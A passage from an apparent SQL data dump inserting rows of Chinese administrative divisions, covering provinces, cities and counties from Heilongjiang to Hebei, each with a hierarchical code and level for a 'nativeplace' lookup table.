.9','nativeplace',4504,2),(17493,'虎林市','4503.8','nativeplace',4504,2),(17492,'鸡东县','4503.7','nativeplace',4504,2),(17491,'麻山区','4503.6','nativeplace',4504,2),(17490,'城子河区','4503.5','nativeplace',4504,2),(17489,'梨树区','4503.4','nativeplace',4503,2),(17488,'滴道区','4503.3','nativeplace',4503,2),(17487,'恒山区','4503.2','nativeplace',4503,2),(17486,'鸡冠区','4503.1','nativeplace',4503,2),(17485,'鸡西市','4503','nativeplace',4503,1),(17484,'讷河市','4502.15','nativeplace',4502,2),(17483,'拜泉县','4502.14','nativeplace',4502,2),(17482,'克东县','4502.13','nativeplace',4502,2),(17481,'克山县','4502.12','nativeplace',4502,2),(17480,'富裕县','4502.11','nativeplace',4502,2),(17479,'甘南县','4502.10','nativeplace',4502,2),(17478,'泰来县','4502.9','nativeplace',4503,2),(17477,'龙江县 依安县','4502.8','nativeplace',4503,2),(17476,'梅里斯达斡尔族区','4502.7','nativeplace',4503,2),(17475,'碾子山区','4502.6','nativeplace',4503,2),(17474,'富拉尔基区','4502.5','nativeplace',4503,2),(17473,'昂昂溪区','4502.4','nativeplace',4502,2),(17472,'铁锋区','4502.3','nativeplace',4502,2),(17471,'建华区','4502.2','nativeplace',4502,2),(17470,'龙沙区','4502.1','nativeplace',4502,2),(17469,'齐齐哈尔市','4502','nativeplace',4502,1),(17468,'五常市','4501.19','nativeplace',4501,2),(17467,'尚志市','4501.18','nativeplace',4501,2),(17466,'双城市','4501.17','nativeplace',4501,2),(17465,'阿城市','4501.16','nativeplace',4501,2),(17464,'延寿县','4501.15','nativeplace',4501,2),(17463,'通河县','4501.14','nativeplace',4501,2),(17462,'木兰县','4501.13','nativeplace',4501,2),(17461,'巴彦县','4501.12','nativeplace',4501,2),(17460,'宾　县','4501.11','nativeplace',4501,2),(17459,'方正县','4501.10','nativeplace',4501,2),(17458,'依兰县','4501.9','nativeplace',4502,2),(17457,'呼兰区','4501.8','nativeplace',4502,2),(17456,'松北区','4501.7','nativeplace',4502,2),(17455,'平房区','4501.6','nativeplace',4502,2),(17454,'动力区','4501.5','nativeplace',4502,2),(17453,'香坊区','4501.4','nativeplace',4501,2),(17452,'道外区','4501.3','nativeplace',4501,2),(17451,'南岗区','4501.2','nativeplace',4501,2),(17450,'道里区','4501.1','nativeplace',4501,2),(17449,'哈尔滨市','4501','nativeplace',4501,1),(17448,'黑龙江省','4500','nativeplace',4500,0),(17447,'安图县','4009.8','nativeplace',4010,2),(17446,'汪清县','4009.7','nativeplace',4010,2),(17445,'和龙市','4009.6','nativeplace',4010,2),(17444,'龙井市','4009.5','nativeplace',4010,2),(17443,'珲春市','4009.4','nativeplace',4009,2),(17442,'敦化市','4009.3','nativeplace',4009,2),(17441,'图们市','4009.2','nativeplace',4009,2),(17440,'延吉市','4009.1','nativeplace',4009,2),(17439,'延边朝鲜族自治州','4009','nativeplace',4009,1),(17438,'大安市','4008.5','nativeplace',4009,2),(17437,'洮南市','4008.4','nativeplace',4008,2),(17436,'通榆县','4008.3','nativeplace',4008,2),(17435,'镇赉县','4008.2','nativeplace',4008,2),(17434,'洮北区','4008.1','nativeplace',4008,2),(17433,'白城市','4008','nativeplace',4008,1),(17432,'扶余县','4007.5','nativeplace',4008,2),(17431,'乾安县','4007.4','nativeplace',4007,2),(17430,'长岭县','4007.3','nativeplace',4007,2),(17429,'前郭尔罗斯蒙古族自治县','4007.2','nativeplace',4007,2),(17428,'宁江区','4007.1','nativeplace',4007,2),(17427,'松原市','4007','nativeplace',4007,1),(17426,'临江市','4006.6','nativeplace',4007,2),(17425,'江源县','4006.5','nativeplace',4007,2),(17424,'长白朝鲜族自治县','4006.4','nativeplace',4006,2),(17423,'靖宇县','4006.3','nativeplace',4006,2),(17422,'抚松县','4006.2','nativeplace',4006,2),(17421,'八道江区','4006.1','nativeplace',4006,2),(17420,'白山市','4006','nativeplace',4006,1),(17419,'集安市','4005.7','nativeplace',4006,2),(17418,'梅河口市','4005.6','nativeplace',4006,2),(17417,'柳河县','4005.5','nativeplace',4006,2),(17416,'辉南县','4005.4','nativeplace',4005,2),(17415,'通化县','4005.3','nativeplace',4005,2),(17414,'二道江区','4005.2','nativeplace',4005,2),(17413,'东昌区','4005.1','nativeplace',4005,2),(17412,'通化市','4005','nativeplace',4005,1),(17411,'东辽县','4004.4','nativeplace',4004,2),(17410,'东丰县','4004.3','nativeplace',4004,2),(17409,'西安区','4004.2','nativeplace',4004,2),(17408,'龙山区','4004.1','nativeplace',4004,2),(17407,'辽源市','4004','nativeplace',4004,1),(17406,'双辽市','4003.6','nativeplace',4004,2),(17405,'公主岭市','4003.5','nativeplace',4004,2),(17404,'伊通满族自治县','4003.4','nativeplace',4003,2),(17403,'梨树县','4003.3','nativeplace',4003,2),(17402,'铁东区','4003.2','nativeplace',4003,2),(17401,'铁西区','4003.1','nativeplace',4003,2),(17400,'四平市','4003','nativeplace',4003,1),(17399,'磐石市','4002.9','nativeplace',4003,2),(17398,'舒兰市','4002.8','nativeplace',4003,2),(17397,'桦甸市','4002.7','nativeplace',4003,2),(17396,'蛟河市','4002.6','nativeplace',4003,2),(17395,'永吉县','4002.5','nativeplace',4003,2),(17394,'丰满区','4002.4','nativeplace',4002,2),(17393,'船营区','4002.3','nativeplace',4002,2),(17392,'龙潭区','4002.2','nativeplace',4002,2),(17391,'昌邑区','4002.1','nativeplace',4002,2),(17390,'吉林市','4002','nativeplace',4002,1),(17389,'德惠市','4001.10','nativeplace',4001,2),(17388,'榆树市','4001.9','nativeplace',4002,2),(17387,'九台市','4001.8','nativeplace',4002,2),(17386,'农安县','4001.7','nativeplace',4002,2),(17385,'双阳区','4001.6','nativeplace',4002,2),(17384,'绿园区','4001.5','nativeplace',4002,2),(17383,'二道区','4001.4','nativeplace',4001,2),(17382,'朝阳区','4001.3','nativeplace',4001,2),(17381,'宽城区','4001.2','nativeplace',4001,2),(17380,'南关区','4001.1','nativeplace',4001,2),(17379,'长春市','4001','nativeplace',4001,1),(17378,'吉林省','4000','nativeplace',4000,0),(17377,'兴城市','3514.6','nativeplace',3515,2),(17376,'建昌县','3514.5','nativeplace',3515,2),(17375,'绥中县','3514.4','nativeplace',3514,2),(17374,'南票区','3514.3','nativeplace',3514,2),(17373,'龙港区','3514.2','nativeplace',3514,2),(17372,'连山区','3514.1','nativeplace',3514,2),(17371,'葫芦岛市','3514','nativeplace',3514,1),(17370,'凌源市','3513.7','nativeplace',3514,2),(17369,'北票市','3513.6','nativeplace',3514,2),(17368,'喀喇沁左翼蒙古族自治县','3513.5','nativeplace',3514,2),(17367,'建平县','3513.4','nativeplace',3513,2),(17366,'朝阳县','3513.3','nativeplace',3513,2),(17365,'龙城区','3513.2','nativeplace',3513,2),(17364,'双塔区','3513.1','nativeplace',3513,2),(17363,'朝阳市','3513','nativeplace',3513,1),(17362,'开原市','3512.7','nativeplace',3513,2),(17361,'调兵山市','3512.6','nativeplace',3513,2),(17360,'昌图县','3512.5','nativeplace',3513,2),(17359,'西丰县','3512.4','nativeplace',3512,2),(17358,'铁岭县','3512.3','nativeplace',3512,2),(17357,'清河区','3512.2','nativeplace',3512,2),(17356,'银州区','3512.1','nativeplace',3512,2),(17355,'铁岭市','3512','nativeplace',3512,1),(17354,'盘山县','3511.4','nativeplace',3511,2),(17353,'大洼县','3511.3','nativeplace',3511,2),(17352,'兴隆台区','3511.2','nativeplace',3511,2),(17351,'双台子区','3511.1','nativeplace',3511,2),(17350,'盘锦市','3511','nativeplace',3511,1),(17349,'灯塔市','3510.7','nativeplace',3511,2),(17348,'辽阳县','3510.6','nativeplace',3511,2),(17347,'太子河区','3510.5','nativeplace',3511,2),(17346,'弓长岭区','3510.4','nativeplace',3510,2),(17345,'宏伟区','3510.3','nativeplace',3510,2),(17344,'文圣区','3510.2','nativeplace',3510,2),(17343,'白塔区','3510.1','nativeplace',3510,2),(17342,'辽阳市','3510','nativeplace',3510,1),(17341,'彰武县','3509.7','nativeplace',3510,2),(17340,'阜新蒙古族自治县','3509.6','nativeplace',3510,2),(17339,'细河区','3509.5','nativeplace',3510,2),(17338,'清河门区','3509.4','nativeplace',3509,2),(17337,'太平区','3509.3','nativeplace',3509,2),(17336,'新邱区','3509.2','nativeplace',3509,2),(17335,'海州区','3509.1','nativeplace',3509,2),(17334,'阜新市','3509','nativeplace',3509,1),(17333,'大石桥市','3508.6','nativeplace',3509,2),(17332,'盖州市','3508.5','nativeplace',3509,2),(17331,'老边区','3508.4','nativeplace',3508,2),(17330,'鲅鱼圈区','3508.3','nativeplace',3508,2),(17329,'西市区','3508.2','nativeplace',3508,2),(17328,'站前区','3508.1','nativeplace',3508,2),(17327,'营口市','3508','nativeplace',3508,1),(17326,'北宁市','3507.7','nativeplace',3508,2),(17325,'凌海市','3507.6','nativeplace',3508,2),(17324,'义　县','3507.5','nativeplace',3508,2),(17323,'黑山县','3507.4','nativeplace',3507,2),(17322,'太和区','3507.3','nativeplace',3507,2),(17321,'凌河区','3507.2','nativeplace',3507,2),(17320,'古塔区','3507.1','nativeplace',3507,2),(17319,'锦州市','3507','nativeplace',3507,1),(17318,'凤城市','3506.6','nativeplace',3507,2),(17317,'东港市','3506.5','nativeplace',3507,2),(17316,'宽甸满族自治县','3506.4','nativeplace',3506,2),(17315,'振安区','3506.3','nativeplace',3506,2),(17314,'振兴区','3506.2','nativeplace',3506,2),(17313,'元宝区','3506.1','nativeplace',3506,2),(17312,'丹东市','3506','nativeplace',3506,1),(17311,'桓仁满族自治县','3505.6','nativeplace',3506,2),(17310,'本溪满族自治县','3505.5','nativeplace',3506,2),(17309,'南芬区','3505.4','nativeplace',3505,2),(17308,'明山区','3505.3','nativeplace',3505,2),(17307,'溪湖区','3505.2','nativeplace',3505,2),(17306,'平山区','3505.1','nativeplace',3505,2),(17305,'本溪市','3505','nativeplace',3505,1),(17304,'清原满族自治县','3504.7','nativeplace',3505,2),(17303,'新宾满族自治县','3504.6','nativeplace',3505,2),(17302,'抚顺县','3504.5','nativeplace',3505,2),(17301,'顺城区','3504.4','nativeplace',3504,2),(17300,'望花区','3504.3','nativeplace',3504,2),(17299,'东洲区','3504.2','nativeplace',3504,2),(17298,'新抚区','3504.1','nativeplace',3504,2),(17297,'抚顺市','3504','nativeplace',3504,1),(17296,'海城市','3503.7','nativeplace',3504,2),(17295,'岫岩满族自治县','3503.6','nativeplace',3504,2),(17294,'台安县','3503.5','nativeplace',3504,2),(17293,'千山区','3503.4','nativeplace',3503,2),(17292,'立山区','3503.3','nativeplace',3503,2),(17291,'铁西区','3503.2','nativeplace',3503,2),(17290,'铁东区','3503.1','nativeplace',3503,2),(17289,'鞍山市','3503','nativeplace',3503,1),(17288,'庄河市','3502.10','nativeplace',3502,2),(17287,'普兰店市','3502.9','nativeplace',3503,2),(17286,'瓦房店市','3502.8','nativeplace',3503,2),(17285,'长海县','3502.7','nativeplace',3503,2),(17284,'金州区','3502.6','nativeplace',3503,2),(17283,'旅顺口区','3502.5','nativeplace',3503,2),(17282,'甘井子区','3502.4','nativeplace',3502,2),(17281,'沙河口区','3502.3','nativeplace',3502,2),(17280,'西岗区','3502.2','nativeplace',3502,2),(17279,'中山区','3502.1','nativeplace',3502,2),(17278,'大连市','3502','nativeplace',3502,1),(17277,'新民市','3501.13','nativeplace',3501,2),(17276,'法库县','3501.12','nativeplace',3501,2),(17275,'康平县','3501.11','nativeplace',3501,2),(17274,'辽中县','3501.10','nativeplace',3501,2),(17273,'于洪区','3501.9','nativeplace',3502,2),(17272,'新城子区','3501.8','nativeplace',3502,2),(17271,'东陵区','3501.7','nativeplace',3502,2),(17270,'苏家屯区','3501.6','nativeplace',3502,2),(17269,'铁西区','3501.5','nativeplace',3502,2),(17268,'皇姑区','3501.4','nativeplace',3501,2),(17267,'大东区','3501.3','nativeplace',3501,2),(17266,'沈河区','3501.2','nativeplace',3501,2),(17265,'和平区','3501.1','nativeplace',3501,2),(17264,'沈阳市','3501','nativeplace',3501,1),(17263,'辽宁省','3500','nativeplace',3500,0),(17262,'额济纳旗','3012.3','nativeplace',3012,2),(17261,'阿拉善右旗','3012.2','nativeplace',3012,2),(17260,'阿拉善左旗','3012.1','nativeplace',3012,2),(17259,'阿拉善盟','3012','nativeplace',3012,1),(17258,'多伦县','3011.12','nativeplace',3011,2),(17257,'正蓝旗','3011.11','nativeplace',3011,2),(17256,'正镶白旗','3011.10','nativeplace',3011,2),(17255,'镶黄旗','3011.9','nativeplace',3012,2),(17254,'太仆寺旗','3011.8','nativeplace',3012,2),(17253,'西乌珠穆沁旗','3011.7','nativeplace',3012,2),(17252,'东乌珠穆沁旗','3011.6','nativeplace',3012,2),(17251,'苏尼特右旗','3011.5','nativeplace',3012,2),(17250,'苏尼特左旗','3011.4','nativeplace',3011,2),(17249,'阿巴嘎旗','3011.3','nativeplace',3011,2),(17248,'锡林浩特市','3011.2','nativeplace',3011,2),(17247,'二连浩特市','3011.1','nativeplace',3011,2),(17246,'锡林郭勒盟','3011','nativeplace',3011,1),(17245,'突泉县','3010.6','nativeplace',3011,2),(17244,'扎赉特旗','3010.5','nativeplace',3011,2),(17243,'科尔沁右翼中旗','3010.4','nativeplace',3010,2),(17242,'科尔沁右翼前旗','3010.3','nativeplace',3010,2),(17241,'阿尔山市','3010.2','nativeplace',3010,2),(17240,'乌兰浩特市','3010.1','nativeplace',3010,2),(17239,'兴安盟','3010','nativeplace',3010,1),(17238,'丰镇市','3009.11','nativeplace',3009,2),(17237,'四子王旗','3009.10','nativeplace',3009,2),(17236,'察哈尔右翼后旗','3009.9','nativeplace',3010,2),(17235,'察哈尔右翼中旗','3009.8','nativeplace',3010,2),(17234,'察哈尔右翼前旗','3009.7','nativeplace',3010,2),(17233,'凉城县','3009.6','nativeplace',3010,2),(17232,'兴和县','3009.5','nativeplace',3010,2),(17231,'商都县','3009.4','nativeplace',3009,2),(17230,'化德县','3009.3','nativeplace',3009,2),(17229,'卓资县','3009.2','nativeplace',3009,2),(17228,'集宁区','3009.1','nativeplace',3009,2),(17227,'乌兰察布市','3009','nativeplace',3009,1),(17226,'杭锦后旗','3008.7','nativeplace',3009,2),(17225,'乌拉特后旗','3008.6','nativeplace',3009,2),(17224,'乌拉特中旗','3008.5','nativeplace',3009,2),(17223,'乌拉特前旗','3008.4','nativeplace',3008,2),(17222,'磴口县','3008.3','nativeplace',3008,2),(17221,'五原县','3008.2','nativeplace',3008,2),(17220,'临河区','3008.1','nativeplace',3008,2),(17219,'巴彦淖尔市','3008','nativeplace',3008,1),(17218,'根河市','3007.13','nativeplace',3007,2),(17217,'额尔古纳市','3007.12','nativeplace',3007,2),(17216,'扎兰屯市','3007.11','nativeplace',3007,2),(17215,'牙克石市','3007.10','nativeplace',3007,2),(17214,'满洲里市','3007.9','nativeplace',3008,2),(17213,'新巴尔虎右旗','3007.8','nativeplace',3008,2),(17212,'新巴尔虎左旗','3007.7','nativeplace',3008,2),(17211,'陈巴尔虎旗','3007.6','nativeplace',3008,2),(17210,'鄂温克族自治旗','3007.5','nativeplace',3008,2),(17209,'鄂伦春自治旗','3007.4','nativeplace',3007,2),(17208,'莫力达瓦达斡尔族自治旗','3007.3','nativeplace',3007,2),(17207,'阿荣旗','3007.2','nativeplace',3007,2),(17206,'海拉尔区','3007.1','nativeplace',3007,2),(17205,'呼伦贝尔市','3007','nativeplace',3007,1),(17204,'伊金霍洛旗','3006.8','nativeplace',3007,2),(17203,'乌审旗','3006.7','nativeplace',3007,2),(17202,'杭锦旗','3006.6','nativeplace',3007,2),(17201,'鄂托克旗','3006.5','nativeplace',3007,2),(17200,'鄂托克前旗','3006.4','nativeplace',3006,2),(17199,'准格尔旗','3006.3','nativeplace',3006,2),(17198,'达拉特旗','3006.2','nativeplace',3006,2),(17197,'东胜区','3006.1','nativeplace',3006,2),(17196,'鄂尔多斯市','3006','nativeplace',3006,1),(17195,'霍林郭勒市','3005.8','nativeplace',3006,2),(17194,'扎鲁特旗','3005.7','nativeplace',3006,2),(17193,'奈曼旗','3005.6','nativeplace',3006,2),(17192,'库伦旗','3005.5','nativeplace',3006,2),(17191,'开鲁县','3005.4','nativeplace',3005,2),(17190,'科尔沁左翼后旗','3005.3','nativeplace',3005,2),(17189,'科尔沁左翼中旗','3005.2','nativeplace',3005,2),(17188,'科尔沁区','3005.1','nativeplace',3005,2),(17187,'通辽市','3005','nativeplace',3005,1),(17186,'敖汉旗','3004.12','nativeplace',3004,2),(17185,'宁城县','3004.11','nativeplace',3004,2),(17184,'喀喇沁旗','3004.10','nativeplace',3004,2),(17183,'翁牛特旗','3004.9','nativeplace',3005,2),(17182,'克什克腾旗','3004.8','nativeplace',3005,2),(17181,'林西县','3004.7','nativeplace',3005,2),(17180,'巴林右旗','3004.6','nativeplace',3005,2),(17179,'巴林左旗','3004.5','nativeplace',3005,2),(17178,'阿鲁科尔沁旗','3004.4','nativeplace',3004,2),(17177,'松山区','3004.3','nativeplace',3004,2),(17176,'元宝山区','3004.2','nativeplace',3004,2),(17175,'红山区','3004.1','nativeplace',3004,2),(17174,'赤峰市','3004','nativeplace',3004,1),(17173,'乌达区','3003.3','nativeplace',3003,2),(17172,'海南区','3003.2','nativeplace',3003,2),(17171,'海勃湾区','3003.1','nativeplace',3003,2),(17170,'乌海市','3003','nativeplace',3003,1),(17169,'达尔罕茂明安联合旗','3002.9','nativeplace',3003,2),(17168,'固阳县','3002.8','nativeplace',3003,2),(17167,'土默特右旗','3002.7','nativeplace',3003,2),(17166,'九原区','3002.6','nativeplace',3003,2),(17165,'白云矿区','3002.5','nativeplace',3003,2),(17164,'石拐区','3002.4','nativeplace',3002,2),(17163,'青山区','3002.3','nativeplace',3002,2),(17162,'昆都仑区','3002.2','nativeplace',3002,2),(17161,'东河区','3002.1','nativeplace',3002,2),(17160,'包头市','3002','nativeplace',3002,1),(17159,'武川县','3001.9','nativeplace',3002,2),(17158,'清水河县','3001.8','nativeplace',3002,2),(17157,'和林格尔县','3001.7','nativeplace',3002,2),(17156,'托克托县','3001.6','nativeplace',3002,2),(17155,'土默特左旗','3001.5','nativeplace',3002,2),(17154,'赛罕区','3001.4','nativeplace',3001,2),(17153,'玉泉区','3001.3','nativeplace',3001,2),(17152,'回民区','3001.2','nativeplace',3001,2),(17151,'新城区','3001.1','nativeplace',3001,2),(17150,'呼和浩特市','3001','nativeplace',3001,1),(17149,'内蒙古自治区','3000','nativeplace',3000,0),(17148,'汾阳市','2511.13','nativeplace',2511,2),(17147,'孝义市','2511.12','nativeplace',2511,2),(17146,'交口县','2511.11','nativeplace',2511,2),(17145,'中阳县','2511.10','nativeplace',2511,2),(17144,'方山县','2511.9','nativeplace',2512,2),(17143,'岚　县','2511.8','nativeplace',2512,2),(17142,'石楼县','2511.7','nativeplace',2512,2),(17141,'柳林县','2511.6','nativeplace',2512,2),(17140,'临　县','2511.5','nativeplace',2512,2),(17139,'兴　县','2511.4','nativeplace',2511,2),(17138,'交城县','2511.3','nativeplace',2511,2),(17137,'文水县','2511.2','nativeplace',2511,2),(17136,'离石区','2511.1','nativeplace',2511,2),(17135,'吕梁市','2511','nativeplace',2511,1),(17134,'霍州市','2510.17','nativeplace',2510,2),(17133,'侯马市','2510.16','nativeplace',2510,2),(17132,'汾西县','2510.15','nativeplace',2510,2),(17131,'蒲　县','2510.14','nativeplace',2510,2),(17130,'永和县','2510.13','nativeplace',2510,2),(17129,'隰　县','2510.12','nativeplace',2510,2),(17128,'大宁县','2510.11','nativeplace',2510,2),(17127,'乡宁县','2510.10','nativeplace',2510,2),(17126,'吉　县','2510.9','nativeplace',2511,2),(17125,'浮山县','2510.8','nativeplace',2511,2),(17124,'安泽县','2510.7','nativeplace',2511,2),(17123,'古　县','2510.6','nativeplace',2511,2),(17122,'洪洞县','2510.5','nativeplace',2511,2),(17121,'襄汾县','2510.4','nativeplace',2510,2),(17120,'翼城县','2510.3','nativeplace',2510,2),(17119,'曲沃县','2510.2','nativeplace',2510,2),(17118,'尧都区','2510.1','nativeplace',2510,2),(17117,'临汾市','2510','nativeplace',2510,1),(17116,'原平市','2509.14','nativeplace',2509,2),(17115,'偏关县','2509.13','nativeplace',2509,2),(17114,'保德县','2509.12','nativeplace',2509,2),(17113,'河曲县','2509.11','nativeplace',2509,2),(17112,'岢岚县','2509.10','nativeplace',2509,2),(17111,'五寨县','2509.9','nativeplace',2510,2),(17110,'神池县','2509.8','nativeplace',2510,2),(17109,'静乐县','2509.7','nativeplace',2510,2),(17108,'宁武县','2509.6','nativeplace',2510,2),(17107,'繁峙县','2509.5','nativeplace',2510,2),(17106,'代　县','2509.4','nativeplace',2509,2),(17105,'五台县','2509.3','nativeplace',2509,2),(17104,'定襄县','2509.2','nativeplace',2509,2),(17103,'忻府区','2509.1','nativeplace',2509,2),(17102,'忻州市','2509','nativeplace',2509,1),(17101,'河津市','2508.13','nativeplace',2508,2),(17100,'永济市','2508.12','nativeplace',2508,2),(17099,'芮城县','2508.11','nativeplace',2508,2),(17098,'平陆县','2508.10','nativeplace',2508,2),(17097,'夏　县','2508.9','nativeplace',2509,2),(17096,'垣曲县','2508.8','nativeplace',2509,2),(17095,'绛　县','2508.7','nativeplace',2509,2),(17094,'新绛县','2508.6','nativeplace',2509,2),(17093,'稷山县','2508.5','nativeplace',2509,2),(17092,'闻喜县','2508.4','nativeplace',2508,2),(17091,'万荣县','2508.3','nativeplace',2508,2),(17090,'临猗县','2508.2','nativeplace',2508,2),(17089,'盐湖区','2508.1','nativeplace',2508,2),(17088,'运城市','2508','nativeplace',2508,1),(17087,'介休市','2507.11','nativeplace',2507,2),(17086,'灵石县','2507.10','nativeplace',2507,2),(17085,'平遥县','2507.9','nativeplace',2508,2),(17084,'祁　县','2507.8','nativeplace',2508,2),(17083,'太谷县','2507.7','nativeplace',2508,2),(17082,'寿阳县','2507.6','nativeplace',2508,2),(17081,'昔阳县','2507.5','nativeplace',2508,2),(17080,'和顺县','2507.4','nativeplace',2507,2),(17079,'左权县','2507.3','nativeplace',2507,2),(17078,'榆社县','2507.2','nativeplace',2507,2),(17077,'榆次区','2507.1','nativeplace',2507,2),(17076,'晋中市','2507','nativeplace',2507,1),(17075,'怀仁县','2506.6','nativeplace',2507,2),(17074,'右玉县','2506.5','nativeplace',2507,2),(17073,'应　县','2506.4','nativeplace',2506,2),(17072,'山阴县','2506.3','nativeplace',2506,2),(17071,'平鲁区','2506.2','nativeplace',2506,2),(17070,'朔城区','2506.1','nativeplace',2506,2),(17069,'朔州市','2506','nativeplace',2506,1),(17068,'高平市','2505.6','nativeplace',2506,2),(17067,'泽州县','2505.5','nativeplace',2506,2),(17066,'陵川县','2505.4','nativeplace',2505,2),(17065,'阳城县','2505.3','nativeplace',2505,2),(17064,'沁水县','2505.2','nativeplace',2505,2),(17063,'城　区','2505.1','nativeplace',2505,2),(17062,'晋城市','2505','nativeplace',2505,1),(17061,'潞城市','2504.13','nativeplace',2504,2),(17060,'沁源县','2504.12','nativeplace',2504,2),(17059,'沁　县','2504.11','nativeplace',2504,2),(17058,'武乡县','2504.10','nativeplace',2504,2),(17057,'长子县','2504.9','nativeplace',2505,2),(17056,'壶关县','2504.8','nativeplace',2505,2),(17055,'黎城县','2504.7','nativeplace',2505,2),(17054,'平顺县','2504.6','nativeplace',2505,2),(17053,'屯留县','2504.5','nativeplace',2505,2),(17052,'襄垣县','2504.4','nativeplace',2504,2),(17051,'长治县','2504.3','nativeplace',2504,2),(17050,'郊　区','2504.2','nativeplace',2504,2),(17049,'城　区','2504.1','nativeplace',2504,2),(17048,'长治市','2504','nativeplace',2504,1),(17047,'盂　县','2503.5','nativeplace',2504,2),(17046,'平定县','2503.4','nativeplace',2503,2),(17045,'郊　区','2503.3','nativeplace',2503,2),(17044,'矿　区','2503.2','nativeplace',2503,2),(17043,'城　区','2503.1','nativeplace',2503,2),(17042,'阳泉市','2503','nativeplace',2503,1),(17041,'南郊区','2502.12','nativeplace',2502,2),(17040,'矿　区','2502.11','nativeplace',2502,2),(17039,'城　区','2502.10','nativeplace',2502,2),(17038,'大同县','2502.9','nativeplace',2503,2),(17037,'左云县','2502.8','nativeplace',2503,2),(17036,'浑源县','2502.7','nativeplace',2503,2),(17035,'灵丘县','2502.6','nativeplace',2503,2),(17034,'广灵县','2502.5','nativeplace',2503,2),(17033,'天镇县','2502.4','nativeplace',2502,2),(17032,'阳高县','2502.3','nativeplace',2502,2),(17031,'新荣区','2502.2','nativeplace',2502,2),(17030,'南郊区','2502.1','nativeplace',2502,2),(17029,'大同市','2502','nativeplace',2502,1),(17028,'古交市','2501.10','nativeplace',2501,2),(17027,'娄烦县','2501.9','nativeplace',2502,2),(17026,'阳曲县','2501.8','nativeplace',2502,2),(17025,'清徐县','2501.7','nativeplace',2502,2),(17024,'晋源区','2501.6','nativeplace',2502,2),(17023,'万柏林区','2501.5','nativeplace',2502,2),(17022,'尖草坪区','2501.4','nativeplace',2501,2),(17021,'杏花岭区','2501.3','nativeplace',2501,2),(17020,'迎泽区','2501.2','nativeplace',2501,2),(17019,'小店区','2501.1','nativeplace',2501,2),(17018,'太原市','2501','nativeplace',2501,1),(17017,'山西省','2500','nativeplace',2500,0),(17016,'河间市','2011.16','nativeplace',2011,2),(17015,'黄骅市','2011.15','nativeplace',2011,2),(17014,'任丘市','2011.14','nativeplace',2011,2),(17013,'泊头市','2011.13','nativeplace',2011,2),(17012,'孟村回族自治县','2011.12','nativeplace',2011,2),(17011,'献　县','2011.11','nativeplace',2011,2),(17010,'吴桥县','2011.10','nativeplace',2011,2),(17009,'南皮县','2011.9','nativeplace',2012,2),(17008,'肃宁县','2011.8','nativeplace',2012,2),(17007,'盐山县','2011.7','nativeplace',2012,2),(17006,'海兴县','2011.6','nativeplace',2012,2),(17005,'东光县','2011.5','nativeplace',2012,2),(17004,'青　县','2011.4','nativeplace',2011,2),(17003,'沧　县','2011.3','nativeplace',2011,2),(17002,'运河区','2011.2','nativeplace',2011,2),(17001,'新华区','2011.1','nativeplace',2011,2),(17000,'沧州市','2011','nativeplace',2011,1),(16999,'深州市','2010.11','nativeplace',2010,2),(16998,'冀州市','2010.10','nativeplace',2010,2),(16997,'阜城县','2010.9','nativeplace',2011,2),(16996,'景　县','2010.8','nativeplace',2011,2),(16995,'故城县','2010.7','nativeplace',2011,2),(16994,'安平县','2010.6','nativeplace',2011,2),(16993,'饶阳县','2010.5','nativeplace',2011,2),(16992,'武强县','2010.4','nativeplace',2010,2),(16991,'武邑县','2010.3','nativeplace',2010,2),(16990,'枣强县','2010.2','nativeplace',2010,2),(16989,'桃城区','2010.1','nativeplace',2010,2),(16988,'衡水市','2010','nativeplace',2010,1),(16987,'三河市','2009.10','nativeplace',2009,2),(16986,'霸州市','2009.9','nativeplace',2010,2),(16985,'大厂回族自治县','2009.8','nativeplace',2010,2),(16984,'文安县','2009.7','nativeplace',2010,2),(16983,'大城县','2009.6','nativeplace',2010,2),(16982,'香河县','2009.5','nativeplace',2010,2),(16981,'永清县','2009.4','nativeplace',2009,2),(16980,'固安县','2009.3','nativeplace',2009,2),(16979,'广阳区','2009.2','nativeplace',2009,2),(16978,'安次区','2009.1','nativeplace',2009,2),(16977,'廊坊市','2009','nativeplace',2009,1),(16976,' 围场满族蒙古族自治县','2008.11','nativeplace',2008,2),(16975,'宽城满族自治','2008.10','nativeplace',2008,2),(16974,'丰宁满族自治县','2008.9','nativeplace',2009,2),(16973,'隆化县','2008.8','nativeplace',2009,2),(16972,'滦平县','2008.7','nativeplace',2009,2),(16971,'平泉县','2008.6','nativeplace',2009,2),(16970,'兴隆县','2008.5','nativeplace',2009,2),(16969,'承德县','2008.4','nativeplace',2008,2),(16968,'鹰手营子矿区','2008.3','nativeplace',2008,2),(16967,'双滦区','2008.2','nativeplace',2008,2),(16966,'双桥区','2008.1','nativeplace',2008,2),(16965,'承德市','2008','nativeplace',2008,1),(16964,'崇礼县','2007.17','nativeplace',2007,2),(16963,'赤城县','2007.16','nativeplace',2007,2),(16962,'涿鹿县','2007.15','nativeplace',2007,2),(16961,'怀来县','2007.14','nativeplace',2007,2),(16960,'万全县','2007.13','nativeplace',2007,2),(16959,'怀安县','2007.12','nativeplace',2007,2),(16958,'阳原县','2007.11','nativeplace',2007,2),(16957,'蔚　县','2007.10','nativeplace',2007,2),(16956,'尚义县','2007.9','nativeplace',2008,2),(16955,'沽源县','2007.8','nativeplace',2008,2),(16954,'康保县','2007.7','nativeplace',2008,2),(16953,'张北县','2007.6','nativeplace',2008,2),(16952,'宣化县','2007.5','nativeplace',2008,2),(16951,'下花园区','2007.4','nativeplace',2007,2),(16950,'宣化区','2007.3','nativeplace',2007,2),(16949,'桥西区','2007.2','nativeplace',2007,2),(16948,'桥东区','2007.1','nativeplace',2007,2),(16947,'张家口市','2007','nativeplace',2007,1),(16946,'高碑店市','2006.25','nativeplace',2006,2),(16945,'安国市','2006.24','nativeplace',2006,2),(16944,'定州市','2006.23','nativeplace',2006,2),(16943,'涿州市','2006.22','nativeplace',2006,2),(16942,'雄　县','2006.21','nativeplace',2006,2),(16941,'博野县','2006.20','nativeplace',2006,2),(16940,'顺平县','2006.19','nativeplace',2006,2),(16939,'蠡　县','2006.18','nativeplace',2006,2),(16938,'曲阳县','2006.17','nativeplace',2006,2),(16937,'易县','2006.16','nativeplace',2006,2),(16936,'安新县','2006.15','nativeplace',2006,2),(16935,'望都县','2006.14','nativeplace',2006,2),(16934,'涞源县','2006.13','nativeplace',2006,2),(16933,'容城县','2006.12','nativeplace',2006,2),(16932,'高阳县','2006.11','nativeplace',2006,2),(16931,'唐　